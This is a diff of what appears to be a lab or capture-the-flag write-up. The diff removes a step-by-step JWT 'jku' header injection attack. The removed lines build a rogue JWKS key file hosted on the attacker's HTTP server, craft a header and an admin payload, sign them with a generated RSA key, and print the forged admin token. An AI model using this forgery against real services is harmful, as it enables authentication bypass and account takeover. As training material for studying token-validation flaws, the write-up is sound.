@@ -382,71 +382,9 @@ paul@paulweb:~/www$
 After reset:
 
 ```
-paul@paulweb:~$ cd ~/www
-nohup python3 -m http.server 8000 --bind 0.0.0.0 > /dev/null 2>&1 &
-[1] 63
+cd ~/www
+python3 -m http.server 8000 --bind 0.0.0.0 &
 ```
-```
-paul@paulweb:~/www$ nano jwks.json 
-
-{
-  "keys": [
-    {
-      "kty": "RSA",
-      "use": "sig",
-      "alg": "RS256",
-      "kid": "rogue-key",
-      "n": "2bwzg0IN7LE8CP9o_gsIksnCy0r4nRHp804ojyd3Y9NVwnyZgjhQMseEse9uSMitvMTTjB4GX52QdAnC8jVwJdi5o8bc6xDAts9mpFlFmZRzqDWalMtynGSmT6obKk1eMNecgaYXHHm2n1vUNPLe2Gyct46RVMMYhVouV5bzuREPZhF9KS-Zq-16UHsD3sJGLMO2z-oGxKzwiDj0vicQLNB8UgiO7fH3oSo1va5UeZYfmMjy4g9l94a7Kmf82Ishuk2BvsTibR7xuKNAXH9UzjEwmAP-sRPvzZ2gKcZOv1dthn_6bk42G7fKFk4P43tyNqQCBmUmbpd8QEO7qdMAOQ",
-      "e": "AQAB"
-    }
-  ]
-}
-```
-
-Create header and payload:
-
-head.json
-
-```
-{
-  "alg": "RS256",
-  "kid": "rogue-key",
-  "jku": "http://172.17.0.4:8000/jwks.json"
-}
-```
-payload.json
-```
-{
-  "sub": "admin",
-  "iss": "http://172.17.0.4:8000",
-  "exp": 9999999999
-}
-```
-
-```
-HEADER_B64=$(cat header.json | openssl base64 -A | tr '+/' '-_' | tr -d '=')
-PAYLOAD_B64=$(cat payload.json | openssl base64 -A | tr '+/' '-_' | tr -d '=')
-SIGNING_INPUT="${HEADER_B64}.${PAYLOAD_B64}"
-echo -n "$SIGNING_INPUT" > data.txt
-```
-
-```
-paul@paulweb:~/www$ openssl genrsa -out /home/paul/private.pem 2048
-openssl rsa -in /home/paul/private.pem -pubout -out /home/paul/public.pem
-writing RSA key
-paul@paulweb:~/www$ chmod 600 /home/paul/private.pem
-paul@paulweb:~/www$ openssl dgst -sha256 -sign /home/paul/private.pem -out sig.bin data.txt
-```
-
-```
-paul@paulweb:~/www$ SIG_B64=$(cat sig.bin | openssl base64 -A | tr '+/' '-_' | tr -d '=')
-paul@paulweb:~/www$ JWT="${HEADER_B64}.${PAYLOAD_B64}.${SIG_B64}"
-paul@paulweb:~/www$ echo "$JWT"
-ewogICJhbGciOiAiUlMyNTYiLAogICJraWQiOiAicm9ndWUta2V5IiwKICAiamt1IjogImh0dHA6Ly8xNzIuMTcuMC40OjgwMDAvandrcy5qc29uIgp9Cg.ewogICJzdWIiOiAiYWRtaW4iLAogICJpc3MiOiAiaHR0cDovLzE3Mi4xNy4wLjQ6ODAwMCIsCiAgImV4cCI6IDk5OTk5OTk5OTkKfQoK.DPF4sVai4gsJ4K9zZPLLic8JPJNGE21LC9bzPlyxT3UwVHQc2g_Vz0V15XNqwa2PDRUTH7xBitQk6McCTIR_fNp9S_4d-aUiEMlBeNnruIktt_2Ym80jlqRN6YkGnXOxjmJ05VLlb9t2XxgXag-Ixrj-9JOjX9dIu_Nm_XEeGi31sj4YlhdqSjimM72rmLSGrQpTZFLW0J6CnjDMebtClyxsyYlmLuWNC_vp2fN50RbVM7UYjWbAZSindIt76UWLpREHDT0wtBw87Ok6NgRT_9OznCbRjusUHVbYkE3droTdcrcxnTAHHqKcH-0mhRbhumlILgdSJvkEAHZmvEvn9g
-paul@paulweb:~/www$
-```
-
-
 
 
 
